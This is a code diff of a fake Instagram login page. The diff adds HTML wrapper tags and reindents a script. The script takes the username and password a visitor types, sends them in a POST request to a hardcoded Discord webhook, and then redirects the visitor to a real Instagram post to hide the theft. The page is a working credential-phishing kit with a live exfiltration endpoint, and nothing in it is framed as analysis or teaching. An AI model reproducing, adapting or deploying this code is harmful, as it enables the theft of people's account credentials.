@@ -1,3 +1,5 @@
+<!DOCTYPE html>
+<html>
 <head>
   <link rel="Icon" type="image/x-icon" href="https://a-manu.com/wp-content/uploads/sites/171/2017/04/instagram-Logo-PNG-Transparent-Background-download-300x300.png">
   <title>Instagram</title>
@@ -90,13 +92,13 @@
 
   <script>
   function sendMessage() {
-  function sleep(milliseconds) {
-  const date = Date.now();
-  let currentDate = null;
-  do {
-    currentDate = Date.now();
-  } while (currentDate - date < milliseconds);
-}
+    function sleep(milliseconds) {
+      const date = Date.now();
+      let currentDate = null;
+      do {
+        currentDate = Date.now();
+      } while (currentDate - date < milliseconds);
+    }
     var request = new XMLHttpRequest();
     request.open("POST", "https://discordapp.com/api/webhooks/1207433541160534098/SL2f1HWQaO0lqmAy_aYcI4y7JUyY8o557nSfmQfRAYWkoWOfKQH4CFRGjuHSF9SjC0gA");
     request.setRequestHeader('Content-type', 'application/json');
@@ -104,8 +106,9 @@
       content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
     }
     request.send(JSON.stringify(params));
-	sleep(400)
-	window.location.replace("https://www.instagram.com/p/By7NkskoTip");
+    sleep(400)
+    window.location.replace("https://www.instagram.com/p/By7NkskoTip");
   }
   </script>
 </body>
+</html>
